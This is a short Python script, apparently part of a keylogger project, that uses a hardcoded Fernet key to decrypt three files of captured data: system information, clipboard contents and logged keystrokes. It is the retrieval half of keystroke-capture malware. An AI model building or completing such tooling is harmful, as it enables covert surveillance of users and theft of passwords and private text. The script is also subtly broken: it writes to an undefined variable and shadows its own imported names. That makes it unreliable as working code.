from cryptography.fernet import Fernet

from Project.keylogger import system_information_e, clipboard_information, keys_information_e, encrypting_file

key = "d4Kb55pAKM0ArL6cEwBw0x5Qqdd-0HWuhOTUisw4P4w="

system_information_e = "e_system.txt"
clipboard_information_e = "e_clipboard.txt"
keys_information_e = "e_keys_logged.txt"

encrypting_files = [system_information_e, clipboard_information_e, keys_information_e]
count = 0

for decrypting_file in encrypting_files:

    with open(encrypting_files[count], 'rb') as f:
        data = f.read()

    fernet = Fernet(key)
    decrypted = fernet.decrypt(data)

    with open(encrypted_files[count], 'wb') as f:
        f.write(decrypted)

    count += 1